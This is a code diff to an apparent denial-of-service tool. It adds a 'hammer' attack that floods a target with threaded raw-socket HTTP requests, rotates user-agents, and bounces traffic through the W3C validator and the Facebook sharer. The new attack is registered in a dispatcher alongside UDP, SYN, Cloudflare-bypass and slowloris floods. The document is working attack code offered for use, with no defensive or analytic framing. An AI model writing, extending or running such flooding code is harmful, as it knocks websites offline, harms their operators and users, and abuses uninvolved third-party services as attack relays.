@@ -10,6 +10,7 @@ from urllib.parse import urlparse
 import dns.resolver
 import socks
 import cloudscraper
+from queue import Queue
 
 # Global variables for user-agent rotation
 USER_AGENTS = [
@@ -17,8 +18,29 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
 ]
+
+# Bots for hammer attack
+HAMMER_BOTS = [
+    "http://validator.w3.org/check?uri=",
+    "http://www.facebook.com/sharer/sharer.php?u="
+]
+
+# Default headers for hammer attack
+HAMMER_HEADERS = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive"""
 
 # Thread limiter to prevent overloading client system
 MAX_THREADS = 100
@@ -325,6 +347,104 @@ def attack_slowloris(target, duration):
         except:
             pass
 
+def attack_hammer(target, duration):
+    """Hammer DoS attack implementation with resource control"""
+    ip, port = resolve_target(target)
+    
+    # Thread count control
+    threads_count = min(50, MAX_THREADS // 2)  # Limit threads to prevent overload
+    
+    # Queues for tasks
+    q = Queue()
+    w = Queue()
+    
+    def bot_hammering(url, end_time):
+        """Hammer using bot URLs"""
+        with active_threads:
+            while time.time() < end_time:
+                try:
+                    req = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=5)
+                    time.sleep(0.1)
+                except:
+                    time.sleep(0.1)
+    
+    def down_it(end_time):
+        """Direct socket hammering"""
+        with active_threads:
+            while time.time() < end_time:
+                try:
+                    # Create a proper HTTP request
+                    packet = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n{HAMMER_HEADERS}\r\n\r\n".encode('utf-8')
+                    
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(3)
+                        s.connect((ip, port))
+                        s.send(packet)
+                        time.sleep(0.1)
+                except:
+                    time.sleep(0.1)
+    
+    def dos(end_time):
+        """Thread function for direct attack"""
+        while time.time() < end_time:
+            try:
+                item = q.get(timeout=1)
+                down_it(end_time)
+                q.task_done()
+            except:
+                pass
+    
+    def dos2(end_time):
+        """Thread function for bot attack"""
+        while time.time() < end_time:
+            try:
+                item = w.get(timeout=1)
+                bot_hammering(random.choice(HAMMER_BOTS) + "http://" + ip, end_time)
+                w.task_done()
+            except:
+                pass
+    
+    end_time = time.time() + duration
+    
+    # Start threads
+    threads = []
+    for i in range(threads_count):
+        t = threading.Thread(target=dos, args=(end_time,))
+        t.daemon = True
+        threads.append(t)
+        t.start()
+        
+        t2 = threading.Thread(target=dos2, args=(end_time,))
+        t2.daemon = True
+        threads.append(t2)
+        t2.start()
+    
+    # Fill queues with tasks
+    item = 0
+    while time.time() < end_time:
+        if item > 1000:  # Prevent memory issues
+            item = 0
+            time.sleep(0.1)
+        item += 1
+        q.put(item)
+        w.put(item)
+    
+    # Wait for duration
+    time.sleep(duration)
+    
+    # Clean up
+    try:
+        q.join()
+        w.join()
+    except:
+        pass
+    
+    for t in threads:
+        try:
+            t.join(timeout=1.0)
+        except:
+            pass
+
 # Attack dispatcher for easy calling
 ATTACK_METHODS = {
     "udp": attack_udp_god,
@@ -332,6 +452,7 @@ ATTACK_METHODS = {
     "syn": attack_tcp_syn,
     "cloudflare": attack_cloudflare_bypass,
     "slowloris": attack_slowloris,
+    "hammer": attack_hammer,  # Added hammer attack
 }
 
 def launch_attack(method, target, duration):
